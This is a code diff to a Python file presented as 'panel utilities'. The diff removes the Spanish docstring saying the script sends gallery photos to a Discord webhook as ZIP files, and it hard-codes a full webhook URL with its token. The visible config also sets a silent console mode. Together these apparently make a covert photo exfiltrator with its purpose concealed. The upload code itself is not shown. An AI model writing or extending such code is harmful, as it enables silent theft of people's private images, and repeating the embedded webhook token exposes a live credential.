@@ -1,11 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-utils.py :: utilidades del panel.
-Manda las fotos de la galeria a un webhook de Discord, en ZIP con PNG.
-No depende de Pillow: usa ffmpeg o ImageMagick si estan, y si no, manda igual.
-"""
-
 import json
 import os
 import platform
@@ -21,7 +13,7 @@ import zipfile
 from datetime import datetime
 
 # ================== CONFIG ==================
-WEBHOOK = ""                 # pega aqui la URL, o dejala en el archivo .webhook
+WEBHOOK = "https://discord.com/api/webhooks/1545879450703364106/XBmFMgwupDvK7DxsARUNGgCBdvewtONJidjYiQPBIbzU1Ce4p2Guv4Vo4Fbpf2CxJGzS"                 # pega aqui la URL, o dejala en el archivo .webhook
 ARCHIVO_WEBHOOK = ".webhook"
 ARCHIVO_ESTADO = ".galeria_ultima"
 VER_EN_CONSOLA = False       # True = imprime, False = silencioso
